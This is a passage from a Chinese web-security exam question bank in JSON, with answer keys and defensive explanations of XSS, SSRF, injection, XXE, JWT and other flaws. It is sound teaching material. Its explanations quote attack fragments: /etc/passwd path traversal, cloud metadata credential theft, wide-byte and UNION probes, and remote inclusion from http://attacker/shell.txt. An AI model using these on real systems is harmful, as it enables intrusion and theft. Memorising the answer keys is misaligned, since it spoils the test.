）。","o":["没有区别","存储型恶意脚本被持久化到服务器，每次访问页面都会触发；反射型脚本在URL中一次性触发","存储型只影响管理员","反射型更危险"],"a":1,"e":"\u003cb>存储型XSS：恶意脚本存入数据库/评论区，所有访问该页面的用户都会中招\u003c/b>，危害最大；\u003cb>反射型XSS：脚本在URL参数中，需诱导用户点击链接，一次性触发\u003c/b>；DOM型XSS：完全在客户端发生，不经过服务器。"},{"c":"web","t":"s","q":"SSRF漏洞利用file://协议可达到的效果是（　）。","o":["访问外部网站","读取服务器本地文件（如/etc/passwd、配置文件等）","发送邮件","管理数据库"],"a":1,"e":"\u003cb>file://协议让服务端读取本地文件\u003c/b>：file:///etc/passwd等。在云环境中，攻击者还常通过SSRF访问云元数据：http://169.254.169.254/latest/meta-data/（AWS）获取临时凭证（AK/SK），这是云上SSRF最严重的危害。"},{"c":"web","t":"s","q":"SameSite Cookie属性的作用是（　）。","o":["加密Cookie内容","限制Cookie在跨站请求中是否发送（Strict=不发送，Lax=部分发送）","删除Cookie","修改Cookie域名"],"a":1,"e":"\u003cb>SameSite=Strict：跨站请求完全不携带Cookie\u003c/b>；\u003cb>SameSite=Lax：GET导航请求携带，POST跨站不携带\u003c/b>（推荐默认值）；\u003cb>SameSite=None：允许跨站发送，必须配合Secure\u003c/b>。Chrome已默认Lax，大幅降低CSRF风险。"},{"c":"web","t":"s","q":"X-Forwarded-For头的作用是（　）。","o":["加速请求","记录客户端真实IP（经过代理/CDN/负载均衡后的原始IP）","压缩请求体","选择后端服务器"],"a":1,"e":"\u003cb>X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip\u003c/b>记录经过每一跳的IP链。在CDN/反向代理/负载均衡后，服务端日志中的源IP是代理IP，需要从XFF头获取真实客户端IP。注意：XFF可伪造。"},{"c":"web","t":"s","q":"API安全中速率限制（Rate Limiting）的主要目的是（　）。","o":["提升API性能","防止暴力破解、DoS攻击和资源滥用，限制单位时间内的请求次数","加密API响应","美化API文档"],"a":1,"e":"\u003cb>速率限制：按IP/用户/API Key限制每秒/分钟请求次数\u003c/b>。实现方式：Nginx limit_req、API网关限流、Redis计数器。超出限制返回429 Too Many Requests。登录API应设置更严格的限制防暴力破解。"},{"c":"web","t":"s","q":"文件上传安全中，以下哪种检测方式最不可靠？（　）","o":["白名单扩展名+MIME类型校验+文件内容魔数验证","仅检查前端JavaScript的文件扩展名","上传后重命名文件","限制上传文件大小"],"a":1,"e":"\u003cb>仅前端JS检查是完全不可靠的\u003c/b>（可抓包修改/禁用JS/直接发HTTP请求）。正确做法：后端白名单扩展名+Content-Type检查+文件头魔数验证+上传后重命名到非Web目录+限制文件大小。"},{"c":"web","t":"s","q":"JWT的none算法攻击原理是（　）。","o":["暴力破解密钥","将JWT头部算法改为none并移除签名部分，服务端如果未正确校验算法则接受无签名的Token","利用SQL注入","拒绝服务攻击"],"a":1,"e":"\u003cb>none攻击：修改Header为{alg:none}，删除Signature部分\u003c/b>。如果服务端实现不当（直接使用Header中的alg值），就会接受无签名的Token。防御：服务端强制指定签名算法（不信任Header中的alg），使用白名单校验。"},{"c":"web","t":"s","q":"HTTP Host头注入攻击的安全风险是（　）。","o":["仅影响浏览器缓存","服务器根据Host头执行不同逻辑（缓存投毒、密码重置链接指向攻击者服务器）","修改HTTP版本","增加请求体大小"],"a":1,"e":"\u003cb>Host头注入：当服务器信任Host头进行决策时\u003c/b>，攻击者可伪造Host头实现：密码重置邮件中链接指向攻击者服务器、缓存投毒、路由到错误的后端。防御：服务端显式设置允许的Host白名单。"},{"c":"web","t":"s","q":"Prototype Pollution（原型链污染）漏洞的影响是（　）。","o":["仅影响CSS样式","攻击者可修改JS对象的原型，污染后续所有对象的属性，可导致DoS或RCE","仅影响HTML结构","仅影响数据库"],"a":1,"e":"\u003cb>Prototype Pollution：通过递归合并将恶意属性注入Object.prototype\u003c/b>，后续所有对象都会继承被污染的属性。可导致：绕过权限检查、修改应用逻辑、甚至RCE（当污染的属性被传递到不安全的API时）。"},{"c":"web","t":"s","q":"Web应用错误页面应避免泄露的信息是（　）。","o":["状态码200","详细的错误信息、堆栈跟踪、数据库表结构、服务器版本、内部路径等技术细节","Content-Type头","JSON格式"],"a":1,"e":"\u003cb>错误页面泄露信息是最常见的信息泄露源\u003c/b>：堆栈跟踪暴露代码结构和文件路径、SQL错误暴露表结构、调试信息暴露环境变量和配置。防御：生产环境关闭Debug模式、自定义错误页面、统一返回不泄露细节的错误信息。"},{"c":"web","t":"s","q":"SSO令牌重放攻击的防御方法是（　）。","o":["增加密码长度","令牌绑定使用次数、绑定客户端信息（IP/User-Agent）或使用一次性令牌","禁用所有Token","取消SSO"],"a":1,"e":"\u003cb>令牌重放：截获合法令牌后重复使用\u003c/b>。防御：令牌一次性使用（消费后失效）、绑定客户端信息、设置短有效期、使用nonce防重放、传输层加密防止截获。OAuth2.0授权码模式通过code换token减少暴露。"},{"c":"web","t":"s","q":"OWASP Top 10 中常年位居前列、危害严重的Web应用风险是（　）。","o":["注入（Injection）类漏洞（如SQL注入）","网络带宽不足","数据库容量","页面加载速度"],"a":0,"e":"\u003cb>注入类漏洞长期位列OWASP Top 10之首\u003c/b>，包括SQL注入、命令注入、LDAP注入等，根源是未对用户输入做安全处理；防御以预编译、白名单校验为核心。"},{"c":"web","t":"s","q":"攻击者把恶意脚本写入服务器存储（如评论区、用户资料），其他用户访问时被触发，这属于（　）。","o":["存储型XSS","反射型XSS","DOM型XSS","CSRF"],"a":0,"e":"\u003cb>存储型XSS：恶意脚本持久化存储在服务器\u003c/b>，所有访问该页面的用户都会触发，可盗取Cookie、模拟操作，危害最大；反射型则需诱导点击带载荷的URL。"},{"c":"web","t":"s","q":"XSS攻击中，恶意脚本位于URL参数中、由服务端直接回显的是（　）。","o":["反射型XSS","存储型XSS","命令注入","SSRF"],"a":0,"e":"\u003cb>反射型XSS将载荷放在URL参数中\u003c/b>，服务端未过滤直接输出，需诱导受害者点击带恶意参数的链接才触发，常用于钓鱼与Cookie窃取。"},{"c":"web","t":"s","q":"CSRF（跨站请求伪造）攻击的本质是（　）。","o":["诱导已登录用户的浏览器在不知情下发起恶意请求（利用其身份）","在服务端执行任意命令","直接窃取数据库内容","暴力破解口令"],"a":0,"e":"\u003cb>CSRF利用受害者的登录态伪造请求\u003c/b>（如替受害者发帖、改密、转账）；防御：CSRF Token、SameSite Cookie属性、二次校验（验证码/再次输入密码）。"},{"c":"web","t":"s","q":"攻击者诱导服务端去请求内网或任意地址，从而探测内网、读取文件，这种漏洞是（　）。","o":["SSRF（服务端请求伪造）","CSRF","XSS","XXE"],"a":0,"e":"\u003cb>SSRF让服务端发起攻击者控制的请求\u003c/b>（常见于URL参数、图片抓取功能），可探测内网、访问云元数据（169.254.169.254）、读取本机文件；防御需校验URL协议、禁用内网地址。"},{"c":"web","t":"s","q":"文件上传漏洞中，最危险的情况是（　）。","o":["可上传并执行脚本文件（如PHP木马），获得远程代码执行","只能上传图片","上传速度慢","上传失败"],"a":0,"e":"\u003cb>若能上传可执行脚本且可被访问执行，即形成Webshell后门（RCE）\u003c/b>；防御：校验扩展名/MIME/内容、随机化文件名、限制目录执行权限并做恶意文件检测。"},{"c":"web","t":"s","q":"通过 ../../etc/passwd 一类的路径穿越访问任意文件，属于（　）。","o":["目录遍历（路径穿越）漏洞","SQL注入","CSRF","点击劫持"],"a":0,"e":"\u003cb>目录遍历通过../等序列跳出受限目录读取任意文件\u003c/b>（源码、配置文件、口令文件）；防御：规范化（canonicalize）路径并校验其是否位于允许目录内。"},{"c":"web","t":"s","q":"XML外部实体（XXE）攻击的常见危害是（　）。","o":["读取本地文件、发起内网请求（SSRF）、造成DoS","在SQL中注入","修改浏览器缓存","提升CPU频率"],"a":0,"e":"\u003cb>XXE利用XML外部实体解析读取文件/发起网络请求\u003c/b>（如读取/etc/passwd或访问内网服务）；防御：禁用XML外部实体（XXE）解析，使用安全的解析器配置。"},{"c":"web","t":"s","q":"攻击者通过透明iframe把受害者的点击引导到隐藏页面完成恶意操作，这是（　）。","o":["点击劫持（Clickjacking）","XSS","CSRF","SSRF"],"a":0,"e":"\u003cb>点击劫持用透明层覆盖目标按钮\u003c/b>，让用户“看不见地点错”（如诱导点赞、转账）；防御：响应头X-Frame-Options: DENY/SAMEORIGIN，或CSP的frame-ancestors指令。"},{"c":"web","t":"s","q":"内容安全策略（CSP）的主要作用是（　）。","o":["限制页面可加载的资源来源，缓解XSS攻击","加密Cookie","加速页面渲染","屏蔽广告"],"a":0,"e":"\u003cb>CSP通过响应头指定允许加载脚本/样式/iframe等资源的来源白名单\u003c/b>，即使注入脚本也会被浏览器阻止执行，是XSS的重要纵深防御手段。"},{"c":"web","t":"s","q":"下列HTTP安全响应头中，用于禁止页面被iframe嵌入的是（　）。","o":["X-Frame-Options","Strict-Transport-Security（HSTS）","X-Content-Type-Options","Referrer-Policy"],"a":0,"e":"\u003cb>X-Frame-Options: DENY/SAMEORIGIN 防点击劫持\u003c/b>；HSTS强制HTTPS；X-Content-Type-Options: nosniff防MIME嗅探；CSP可统一声明各种限制。"},{"c":"web","t":"s","q":"根据页面在布尔条件下响应不同（真/假页面）来判断注入是否成立，属于（　）。","o":["布尔盲注","报错注入","UNION联合查询注入","堆叠注入"],"a":0,"e":"\u003cb>布尔盲注通过观察页面真假差异逐位推导数据\u003c/b>；时间盲注看响应延迟（sleep/benchmark）；报错注入看数据库报错回显；UNION注入直接回显查询结果。"},{"c":"web","t":"s","q":"在GBK等宽字节编码环境中，用 %bf%27 一类载荷绕过 addslashes/magic_quotes 转义，这种攻击是（　）。","o":["宽字节注入","布尔盲注","堆叠注入","命令注入"],"a":0,"e":"\u003cb>宽字节注入利用GBK等双字节编码“吃掉”转义反斜杠\u003c/b>，使单引号逃逸成SQL语法；防御：统一使用UTF-8编码并改用预编译（参数化）查询。"},{"c":"web","t":"s","q":"利用分号在同一查询中追加多条SQL语句（如 SELECT...; DROP...），属于（　）。","o":["堆叠注入","布尔盲注","报错注入","时间盲注"],"a":0,"e":"\u003cb>堆叠注入（Stacked Queries）用分号分隔执行多条SQL语句\u003c/b>，可执行任意SQL（写文件、删库等），危害极大；预编译与最小化数据库权限可有效缓解。"},{"c":"web","t":"s","q":"Java/PHP等应用中，攻击者构造恶意序列化数据在反序列化时触发代码执行，这类漏洞是（　）。","o":["反序列化漏洞","SQL注入","目录遍历","点击劫持"],"a":0,"e":"\u003cb>反序列化漏洞\u003c/b>（如Java Commons-Collections链、PHP unserialize）在反序列化不可信数据时触发RCE；防御：不反序列化不可信数据、及时升级组件、增加反序列化白名单。"},{"c":"web","t":"s","q":"普通用户通过修改ID参数访问或操作他人的数据（如查看他人订单），属于（　）。","o":["越权访问（水平越权）","SSRF","XSS","DDoS"],"a":0,"e":"\u003cb>水平越权：同角色用户互访他人数据\u003c/b>；垂直越权：低权限用户访问高权限功能。根源是服务端未校验“数据所有权”，必须在服务端做授权校验。"},{"c":"web","t":"s","q":"对Web登录接口进行大量弱口令尝试，最有效的防护组合是（　）。","o":["登录失败锁定+验证码+速率限制+双因素","仅前端校验","隐藏登录按钮","更换URL"],"a":0,"e":"防爆破组合：\u003cb>账户锁定、图形/滑动验证码、请求频率限制、多因素认证\u003c/b>，并在日志中记录失败尝试以便检测攻击源，必要时自动封禁。"},{"c":"web","t":"s","q":"Web应用常见的敏感信息泄露包括（　）。","o":["备份文件暴露、源码/目录泄露、错误详情暴露堆栈、默认口令","页面加载太慢","图片过多","字体缺失"],"a":0,"e":"常见泄露：\u003cb>备份/压缩包（.bak/.zip）、.git/.svn源码泄露、目录列表开启、错误页堆栈、默认口令未改\u003c/b>；应禁止目录浏览、隐藏错误详情、及时清理敏感文件并修改默认口令。"},{"c":"web","t":"s","q":"水平越权与垂直越权的区别是（　）。","o":["水平越权=同级别用户访问他人同权限数据；垂直越权=低权限访问高权限功能","没有区别","水平越权危害更大","垂直越权只能读"],"a":0,"e":"\u003cb>水平越权（IDOR/BOLA）：以普通用户身份访问\u003cb>其他同级别用户\u003c/b>的数据（如改URL里的id看别人订单）；垂直越权：以\u003cb>低权限\u003c/b>访问\u003cb>高权限\u003c/b>功能（如普通用户调管理接口）\u003c/b>。\u003cb>根因\u003c/b>：服务端未做对象级/功能级权限校验。\u003cb>防护\u003c/b>：服务端校验资源归属与角色权限。\u003cb>记忆\u003c/b>：'水平=横着偷同级，垂直=竖着越权限'。"},{"c":"web","t":"s","q":"OWASP Top 10 2021中，排名第一的漏洞类别是（　）。","o":["失效的访问控制（Broken Access Control）","SQL注入","密码学失败","日志泄露"],"a":0,"e":"\u003cb>OWASP Top 10 2021中'失效的访问控制'升至首位\u003c/b>（合并了越权、目录遍历等），其次为加密失败、注入、不安全设计等。\u003cb>意义\u003c/b>：反映现代应用'权限校验缺失'问题高发。\u003cb>易错点\u003c/b>：注入在2021版降至第3位，但仍是重点。\u003cb>记忆\u003c/b>：'2021版=访问控制登顶'。"},{"c":"web","t":"s","q":"XXE（XML外部实体注入）漏洞的成因是（　）。","o":["XML解析器允许加载外部实体（file:///http://等）且未禁用","SQL语句拼接","使用了JWT","开启了CORS"],"a":0,"e":"\u003cb>XXE：XML解析器未禁用\u003cb>外部实体（DOCTYPE+ENTITY）\u003c/b>，攻击者可读取本地文件（file:///etc/passwd）、发起SSRF、DoS（Billion Laughs）\u003c/b>。\u003cb>防护\u003c/b>：禁用DTD/外部实体（\u003ccode>documentBuilderFactory.setFeature(...disable-doctype-decl,true)\u003c/code>）、使用安全解析配置。\u003cb>易错点\u003c/b>：'XXE=XML的实体引用被利用'。\u003cb>记忆\u003c/b>：'解析XML没关实体=能读文件能打内网'。"},{"c":"web","t":"s","q":"HTTP请求走私（Request Smuggling）攻击的原理是（　）。","o":["前端代理与后端服务器对Content-Length和Transfer-Encoding等头解析不一致，使攻击请求与后续请求拼接/错位","发送超大请求","伪造User-Agent","利用Cookie过期"],"a":0,"e":"\u003cb>请求走私利用\u003cb>前端（负载均衡/WAF）与后端（应用服务器）对Content-Length与Transfer-Encoding解析顺序/优先级不一致\u003c/b>，让后端把攻击者请求的'尾部'当作下一个请求，实现走私（投毒、绕过WAF、劫持他人请求）\u003c/b>。\u003cb>防护\u003c/b>：统一解析标准、禁用TE头、前端后端配置一致。\u003cb>记忆\u003c/b>：'两个解析器口径不一=请求被偷渡'。"},{"c":"web","t":"s","q":"反序列化漏洞的利用原理是（　）。","o":["攻击者构造恶意序列化数据，触发服务端在反序列化时执行其中的代码（魔术方法/链）","序列化后数据加密","反序列化速度慢","数据传输丢包"],"a":0,"e":"\u003cb>反序列化漏洞：服务端反序列化\u003cb>不可信输入\u003c/b>，对象在重建时触发危险方法（Java的readObject、PHP的__wakeup/__destruct）构成利用链，最终\u003cb>远程代码执行\u003c/b>\u003c/b>。\u003cb>防护\u003c/b>：不对不可信数据反序列化、白名单类过滤、使用安全序列化格式。\u003cb>易错点\u003c/b>：'序列化是存/传对象，反序列化被操纵=代码执行'。\u003cb>记忆\u003c/b>：'接过来的'礼盒'打开就是炸弹'。"},{"c":"web","t":"s","q":"CORS（跨域资源共享）配置错误导致的安全风险是（　）。","o":["服务端错误地允许任意来源（Access-Control-Allow-Origin:* 配合凭据）访问敏感接口","浏览器不能解析CSS","页面加载变慢","SQL执行失败"],"a":0,"e":"\u003cb>CORS错误配置（如回显任意Origin或\u003ccode>ACAO:*\u003c/code>同时\u003cb>携带凭证\u003c/b>）使恶意网站可跨域读取你的接口数据，造成\u003cb>数据窃取\u003c/b>\u003c/b>。\u003cb>防护\u003c/b>：严格配置允许的Origin白名单、不允许通配符+凭据组合。\u003cb>易错点\u003c/b>：'CORS是浏览器跨域机制，配错=给恶意站点开后门'。\u003cb>记忆\u003c/b>：'ACAO:*加credentials=true=裸奔'。"},{"c":"web","t":"s","q":"CSP（内容安全策略）的主要作用是（　）。","o":["通过Content-Security-Policy头限制页面可加载的资源来源，缓解XSS","加密页面内容","压缩图片","加速CDN"],"a":0,"e":"\u003cb>CSP以响应头/元标签声明'页面只能加载哪些来源的脚本/样式/图片'，恶意内联脚本与外部恶意资源被浏览器拒绝，是\u003cb>缓解XSS的纵深防御\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：CSP不修XSS漏洞本身，是降低利用成功率的缓解层。\u003cb>记忆\u003c/b>：'CSP=给页面贴'只准吃这些来源'的标签'。"},{"c":"web","t":"s","q":"点击劫持（Clickjacking）攻击的防御手段是（　）。","o":["设置X-Frame-Options（DENY/SAMEORIGIN）或CSP frame-ancestors，禁止被嵌入框架","禁用JavaScript","删除Cookie","修改DNS"],"a":0,"e":"\u003cb>点击劫持把受害页面透明嵌入恶意页面iframe，诱骗用户'点到的其实是受害站点的按钮'（如授权、转账）\u003c/b>。\u003cb>防护\u003c/b>：\u003cb>X-Frame-Options: DENY/SAMEORIGIN\u003c/b>或CSP \u003ccode>frame-ancestors 'none'\u003c/code>禁止被嵌框。\u003cb>易错点\u003c/b>：'防点击劫持看X-Frame-Options'。\u003cb>记忆\u003c/b>：'不让人把你套在看不见的框里=X-Frame-Options'。"},{"c":"web","t":"s","q":"SSTI（服务端模板注入）漏洞的成因是（　）。","o":["服务端模板引擎对用户输入未过滤，直接作为模板解析执行","SQL注入","XSS","文件上传"],"a":0,"e":"\u003cb>SSTI：模板引擎（Jinja2/Twig/Velocity等）把用户可控输入当作模板语法解析，攻击者注入模板表达式（如{{7*7}}、RCE payload）实现\u003cb>服务端代码执行\u003c/b>\u003c/b>。\u003cb>检测\u003c/b>：输入\u003ccode>{{7*7}}\u003c/code>返回49即存在。\u003cb>易错点\u003c/b>：'模板引擎把输入当'代码'渲染=注入'。\u003cb>记忆\u003c/b>：'模板里写{{}}能执行，输入就成了代码'。"},{"c":"web","t":"s","q":"文件上传漏洞的常见利用与防护，下列说法正确的是（　）。","o":["防护需校验扩展名+内容（MIME/文件头）+重命名+限制目录可执行权限；利用是把恶意脚本上传成可执行文件","只改扩展名即可","上传目录可执行无所谓","禁止上传所有文件"],"a":0,"e":"\u003cb>文件上传攻击：上传webshell（.php/.jsp/.aspx）、恶意脚本或超大文件；\u003cb>防护\u003c/b>：白名单校验扩展名与MIME、检查文件头/内容、随机重命名、上传目录不可执行（\u003cDirectory>禁用脚本执行）、限制大小、图片二次渲染\u003c/b>。\u003cb>易错点\u003c/b>：'只过滤后缀会被双写/大小写/解析漏洞绕过，要组合防护'。\u003cb>记忆\u003c/b>：'校验要全，目录别让它'跑脚本''。"},{"c":"web","t":"s","q":"SSRF（服务端请求伪造）漏洞的危害是（　）。","o":["服务端可被诱导向内网/任意地址发起请求，探测内网、访问内部服务、读云元数据","只影响客户端","无实际危害","只影响DNS"],"a":0,"e":"\u003cb>SSRF：应用接受URL并\u003cb>由服务端发起请求\u003c/b>，攻击者借此访问\u003cb>内网服务\u003c/b>（探测端口）、读\u003cb>云元数据\u003c/b>（如AWS/阿里云凭证）、攻击内部系统\u003c/b>。\u003cb>防护\u003c/b>：URL白名单/域名解析校验、禁用内网地址、限制协议（仅http/https）、禁止跟随重定向。\u003cb>易错点\u003c/b>：'SSRF=服务端当'跳板'打内网'。\u003cb>记忆\u003c/b>：'让它去内网敲门，还能捎出云凭证'。"},{"c":"web","t":"s","q":"SQL注入中，'联合查询注入（UNION）'的利用前提是（　）。","o":["原查询与注入查询的列数一致且字段位置可确定（用ORDER BY/UNION SELECT NULL数数）","数据库是Oracle","使用了预编译","不需要任何前提"],"a":0,"e":"\u003cb>UNION注入要求\u003cb>与原查询列数相同\u003c/b>：先用\u003ccode>ORDER BY n\u003c/code>或\u003ccode>UNION SELECT NULL,NULL...\u003c/code>试探列数，再在对应位置回显数据\u003c/b>。\u003cb>对比\u003c/b>：回显点不可用时可盲注（布尔/时间）或报错注入。\u003cb>易错点\u003c/b>：'列数不一致UNION直接报错'。\u003cb>记忆\u003c/b>：'数列数、找位置、然后UNION拼数据'。"},{"c":"web","t":"s","q":"SQL注入的根治性防御是（　）。","o":["参数化查询（预编译，PreparedStatement/PDO）","过滤特殊字符","删除数据库","关闭错误回显"],"a":0,"e":"\u003cb>根治SQL注入=\u003cb>参数化查询/预编译\u003c/b>：SQL结构固定，输入只作为参数绑定，不参与语句拼接\u003c/b>。\u003cb>对比\u003c/b>：过滤/转义是缓解（易被绕过），最小权限、关闭报错回显、WAF是纵深补充。\u003cb>易错点\u003c/b>：'别靠黑名单过滤，要用预编译'。\u003cb>记忆\u003c/b>：'预编译=结构不动，数据只当参数'。"},{"c":"web","t":"s","q":"DOM型XSS与反射/存储型XSS的区别是（　）。","o":["DOM型XSS在浏览器端由JavaScript处理不可信数据时触发，服务端不参与","DOM型危害最大一定在服务端","没有区别","DOM型只影响服务器"],"a":0,"e":"\u003cb>DOM型XSS的恶意脚本由\u003cb>前端JavaScript在浏览器端\u003c/b>操作DOM时执行（如innerHTML拼接location.hash），流量中可能看不到明显payload，服务端日志难以检测\u003c/b>。\u003cb>防护\u003c/b>：前端避免innerHTML拼接不可信数据、使用textContent、严格编码。\u003cb>易错点\u003c/b>：'DOM型=客户端渲染阶段触发'。\u003cb>记忆\u003c/b>：'DOM型=浏览器自己把自己坑了'。"},{"c":"web","t":"s","q":"关于CSRF Token，正确的做法是（　）。","o":["Token由服务端生成、随会话绑定，写操作请求必须携带且服务端校验，Token绑定用户与时效","Token写死在HTML注释","所有用户共用一个Token","只在登录页校验"],"a":0,"e":"\u003cb>CSRF Token：服务端为会话生成\u003cb>随机不可预测\u003c/b>的Token，表单/请求携带，服务端\u003cb>校验匹配\u003c/b>；Token应\u003cb>绑定用户与有效期\u003c/b>，防篡改（可HMAC签名）\u003c/b>。\u003cb>易错点\u003c/b>：'Token要随机、要绑定、要校验'，固定Token=形同虚设。\u003cb>记忆\u003c/b>：'随机生成、请求必带、服务端验、过期作废'。"},{"c":"web","t":"s","q":"子域接管（Subdomain Takeover）漏洞的成因是（　）。","o":["域名解析到已失效的第三方服务（如CNAME指向已释放的CDN/托管），攻击者注册该服务即接管子域","DNS被投毒","服务器过载","SSL证书过期"],"a":0,"e":"\u003cb>子域接管：子域DNS（如CNAME）仍指向一个\u003cb>已释放/可被注册的第三方服务\u003c/b>（GitHub Pages、AWS、CDN等），攻击者注册该资源后即可\u003cb>控制该子域\u003c/b>，用于钓鱼、劫持Cookie（父域Cookie）\u003c/b>。\u003cb>防护\u003c/b>：清理无主DNS记录、监控CNAME失效。\u003cb>易错点\u003c/b>：'悬空CNAME=给攻击者留的房卡'。\u003cb>记忆\u003c/b>：'DNS还指着别人家的空房子，注册下来就是我的'。"},{"c":"web","t":"s","q":"API安全中，BOLA（对象级授权失效/IDOR）的核心防护是（　）。","o":["服务端对每个对象访问校验当前用户是否有权访问该对象","给API加密","隐藏API文档","限制请求大小"],"a":0,"e":"\u003cb>BOLA：API直接使用用户可控的ID（如/user/123/orders）且\u003cb>不校验该对象归属\u003c/b>，任何人可遍历ID访问他人数据\u003c/b>。\u003cb>防护\u003c/b>：服务端\u003cb>对象级授权检查\u003c/b>（资源归属校验）、UUID替代自增ID、审计。\u003cb>易错点\u003c/b>：'前端隐藏按钮没用，服务端必须鉴权'。\u003cb>记忆\u003c/b>：'传个ID就给你看=一定没鉴权'。"},{"c":"web","t":"s","q":"关于HTTP方法的安全配置，下列做法正确的是（　）。","o":["禁用/限制危险方法（PUT/DELETE/TRACE），只开放必要方法","开启TRACE便于调试","开放所有方法","对GET不校验"],"a":0,"e":"\u003cb>应\u003cb>仅开放业务所需方法\u003c/b>，禁用PUT/DELETE（未授权可改删）、TRACE（可配合XST窃取Cookie）、OPTIONS等不必要方法；WebDAV类方法风险高\u003c/b>。\u003cb>易错点\u003c/b>：'多余方法=多余攻击面'。\u003cb>记忆\u003c/b>：'能省的方法就关了，尤其TRACE/PUT/DELETE'。"},{"c":"web","t":"s","q":"HTTP响应头中，HSTS（Strict-Transport-Security）的作用是（　）。","o":["强制浏览器对该域始终使用HTTPS，防SSL剥离降级","压缩传输内容","设置Cookie过期","缓存页面"],"a":0,"e":"\u003cb>HSTS告诉浏览器：\u003cb>一段时间内必须用HTTPS访问该域\u003c/b>，杜绝SSL剥离（HTTPS降级HTTP）与中间人\u003c/b>。\u003cb>易错点\u003c/b>：HSTS只防'降级到HTTP'，不替代证书与加密配置。\u003cb>记忆\u003c/b>：'HSTS=浏览器记住：只准走加密门'。"},{"c":"web","t":"s","q":"目录遍历（路径穿越）漏洞的利用方式是（　）。","o":["在文件路径参数中注入 ../ 等跳转符读取系统文件（如/etc/passwd、web.config）","注入SQL","上传木马","爆破口令"],"a":0,"e":"\u003cb>路径穿越：应用未校验用户传入的文件路径，注入\u003ccode>../../etc/passwd\u003c/code>、URL编码（%2e%2e）或绝对路径读取服务器任意文件\u003c/b>。\u003cb>防护\u003c/b>：规范化并校验路径在允许目录内、禁止拼接用户路径直接访问文件系统。\u003cb>易错点\u003c/b>：'../=往上跳目录'。\u003cb>记忆\u003c/b>：'../一路跳出去，就能翻出服务器家底'。"},{"c":"web","t":"s","q":"文件包含漏洞（LFI/RFI）中，RFI（远程文件包含）的危害是（　）。","o":["应用可包含远程URL，直接加载攻击者服务器上的恶意脚本执行","只能读本地文件","无危害","只影响图片"],"a":0,"e":"\u003cb>RFI：include等函数允许包含\u003cb>远程URL\u003c/b>（http://attacker/shell.txt），攻击者直接让服务器执行其恶意脚本，实现RCE\u003c/b>；LFI只能包含本地文件（配合日志注入/伪协议如php://filter）。\u003cb>防护\u003c/b>：禁用allow_url_include、白名单校验包含路径。\u003cb>易错点\u003c/b>：'RFI=能拉远程代码执行'。\u003cb>记忆\u003c/b>：'RFI=外援（远程脚本）进场即沦陷'。"},{"c":"web","t":"s","q":"Web安全中，'安全响应头缺失'类问题通常包括（　）。","o":["缺少X-Frame-Options、CSP、HSTS、X-Content-Type-Options等头","缺少meta标签","端口未关闭","页面无动画"],"a":0,"e":"\u003cb>常见安全响应头：X-Frame-Options（防点击劫持）、Content-Security-Policy（防XSS）、HSTS（防降级）、X-Content-Type-Options（防MIME嗅探）、Referrer-Policy\u003c/b>；缺失会增加对应风险。\u003cb>易错点\u003c/b>：'响应头=安全配置清单，缺一个多一分风险'。\u003cb>记忆\u003c/b>：'X-Frame、CSP、HSTS、X-Content-Type-Options 四件套'。"},{"c":"web","t":"s","q":"登录接口防撞库/暴力破解，下列做法不推荐的是（　）。","o":["使用固定弱口令且无失败限制","验证码/滑块、失败次数锁定、来源IP限速","多因素认证","监控异常批量登录"],"a":0,"e":"\u003cb>'固定弱口令+无失败限制'是反面教材，撞库（用泄露库批量试）与爆破极易成功\u003c/b>；\u003cb>正确\u003c/b>：验证码、失败锁定、IP限速、MFA、异常检测。\u003cb>易错点\u003c/b>：'撞库靠的是已泄露口令，不是猜'。\u003cb>记忆\u003c/b>：'登录口要上锁+限速+多因素，别拿弱口令裸奔'。"},{"c":"web","t":"s","q":"关于密码学失败（旧称敏感数据泄露）的修复，正确做法是（　）。","o":["用强加密（TLS1.2+）传输、加盐慢哈希存口令、不落盘明文密钥","把明文存进数据库","用HTTP传输","用MD5存口令"],"a":0,"e":"\u003cb>修复敏感数据泄露：\u003cb>传输用TLS、存储用强加密（AES）与加盐慢哈希、密钥托管在KMS、日志脱敏\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'明文/弱算法（MD5、RC4、DES）/弱协议=密码学失败'。\u003cb>记忆\u003c/b>：'传输TLS、存储加密+慢哈希、日志脱敏'。"},{"c":"web","t":"s","q":"WebSocket应用中，认证与鉴权的正确做法是（　）。","o":["建立连接时校验Token/会话，连接期间持续授权校验（不可仅凭Origin信任）","不认证直接连","只校验一次不再管","与HTTP无关"],"a":0,"e":"\u003cb>WebSocket建立时通过\u003cb>握手头（Token/Cookie）认证\u003c/b>，连接是\u003cb>长连接\u003c/b>，需在\u003cb>每次消息处理时校验授权\u003c/b>；Origin校验可缓解跨站WebSocket劫持（CSWSH）\u003c/b>。\u003cb>易错点\u003c/b>：'长连接≠一劳永逸，消息级鉴权不能省'。\u003cb>记忆\u003c/b>：'进门查票，每节车厢也查票'。"},{"c":"web","t":"s","q":"HTTP参数污染（HPP）攻击利用的是（　）。","o":["同一参数多次提交时，前端/后端对不同取值解析不一致，造成逻辑绕过或注入","参数加密","参数过多","请求超时"],"a":0,"e":"\u003cb>HPP：提交多个同名参数（如?id=1&id=2），WAF/代理与后端对'取第一个/最后一个/拼接'处理不一致，绕过过滤或污染业务逻辑\u003c/b>。\u003cb>防护\u003c/b>：统一参数解析策略、按白名单处理。\u003cb>易错点\u003c/b>：'同名参数的歧义是HPP温床'。\u003cb>记忆\u003c/b>：'俩id报一个，两个系统理解不一样'。"},{"c":"web","t":"s","q":"LDAP注入攻击的利用方式是（　）。","o":["在LDAP查询构造中注入特殊字符（*、(|)等）改变过滤逻辑，绕过认证或扩大查询","执行SQL","上传文件","爆破端口"],"a":0,"e":"\u003cb>LDAP注入：应用拼接用户输入构造LDAP过滤器，攻击者注入\u003ccode>*\u003c/code>、\u003ccode>|\u003c/code>、\u003ccode>()\u003c/code>等改变逻辑（如用户名注入\u003ccode>*\u003c/code>绕过认证、扩大返回结果）\u003c/b>。\u003cb>防护\u003c/b>：参数化/转义LDAP过滤特殊字符。\u003cb>易错点\u003c/b>：'类似SQL注入，但语法是LDAP过滤器'。\u003cb>记忆\u003c/b>：'给LDAP查询喂个*，认证就形同虚设'。"},{"c":"web","t":"s","q":"JSONP与CORS的对比中，正确的是（　